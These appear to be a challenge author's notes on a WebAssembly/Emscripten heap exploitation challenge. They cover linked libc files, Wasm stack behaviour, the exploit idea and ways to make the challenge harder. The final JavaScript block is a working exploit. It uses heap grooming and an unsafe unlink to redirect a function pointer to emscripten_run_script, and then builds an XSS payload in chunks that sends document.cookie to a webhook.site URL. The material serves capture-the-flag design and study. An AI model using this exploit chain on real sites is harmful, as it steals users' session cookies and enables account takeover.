# Linking
When compiling with `-g`, it includes the files used to link
```
/emsdk/emscripten/system/lib/libc/emscripten_memcpy.c
/emsdk/emscripten/system/lib/libc/emscripten_memset.c
/emsdk/emscripten/system/lib/libc/musl/src/errno/__errno_location.c
main.c
/emsdk/emscripten/system/lib/libc/musl/src/stdio/ofl.c
/emsdk/emscripten/system/lib/sbrk.c
/emsdk/emscripten/system/lib/libc/musl/src/stdio/fflush.c
/emsdk/emscripten/system/lib/libc/emscripten_get_heap_size.c
/emsdk/emscripten/system/lib/libc/musl/src/stdio/__lockfile.c
/emsdk/emscripten/system/lib/dlmalloc.c
/emsdk/emscripten/system/lib/pthread/library_pthread_stub.c
```

https://github.com/emscripten-core/emscripten/blob/main/system/lib/dlmalloc.c


# Wasm
Wasm opcodes contain their own stack and local variables (In this case wasm is using it like registers)
	No bufferoverflow to override return pointer
		I think redirecting codeflow is impossible (Unless you can jump to shellcode)

There is a stack pointer to manage local variables
	All local variables are still stores on the stack
	Seems like the wasm locals are used as registers
		Wasm locals != stack local variables


# Idea
Heap exploit -> emscripten_run_script -> xss with short payload -> modify memory -> full xss

# Exploit
Unsafe unlink to overwrite function pointer to emscripten_run_script
	Can send 10 byte payloads
		Use primitive to get xss

# Ideas to make it harder
Only allow 1-2 calls to greet()
	Can't slowly build gadgets to get full xss
	Forces you to somehow modify memory to get more calls


```js
var titles = 66144
var title_fp = 66112
var cnt = 66128
_add(0, "A".repeat(0x242))
_add(1, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB")
_add(2, "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC")
_add(3, "")
_add(4, "EEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE")
_delete(2)
_edit(2, "R\x02\x01")
_delete(1)
_edit(0, '\x03'.repeat(0x241))
_greet(3)
console.log(prettyPrint(titles, 20))
console.log(prettyPrint(title_fp, 1))
// M=HEAP8;A=66128;M[A]=0
// M[A]=0;"location='//"
// M[A]=0;$_+"webhook.sit"
// M[A]=0;$_+"e/da7959eb-"
// M[A]=0;$_+"73ec-43cc-"
// M[A]=0;$_+"8495-439101"
// M[A]=0;$_+"f11175/'+do"
// M[A]=0;$_+"cument.cook"
// M[A]=0;eval($_+"ie")


printHeap()
```